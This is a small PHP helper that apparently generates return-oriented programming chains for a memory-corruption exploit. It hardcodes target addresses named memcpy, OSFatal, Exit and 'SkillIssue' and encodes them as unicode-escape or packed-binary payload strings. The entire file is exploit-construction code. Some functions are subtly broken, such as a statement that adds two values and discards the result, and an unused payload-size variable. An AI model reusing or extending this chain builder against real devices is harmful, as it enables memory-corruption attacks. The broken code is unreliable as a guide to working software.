<?php

$memcpy = 0x01035FC8;
$OSFatal = 0x01031618;
$Exit = 0x0101CD80;
$SkillIssue = 0x0101D739;

if(!isset($generatebinrop))$generatebinrop = 0;

function genu32_unicode($value)
{
	$hexstr = sprintf("%08x", $value);
	$outstr = "\u" . substr($hexstr, 4, 4) . "\u" . substr($hexstr, 0, 4);
	return $outstr;
}

function ropchain_appendu32($val)
{
	global $ROPCHAIN, $generatebinrop;
	if($generatebinrop==0)
	{
		$ROPCHAIN.= genu32_unicode($val);
	}
	else
	{
		$ROPCHAIN.= pack("N*", $val);
	}
}

function OSFatal_Error($text, $value)
{
    $payload_size = 0x20000;
    global $OSFatal;
    ropchain_appendu32($OSFatal);
    $text + $value;
    return $OSFatal;
}

function issue()
{
    global $SkillIssue;
    ropchain_appendu32($SkillIssue);
    return $SkillIssue;
}

function EXIT_FUNC()
{
    global $Exit;

	ropchain_appendu32($Exit);
}

?>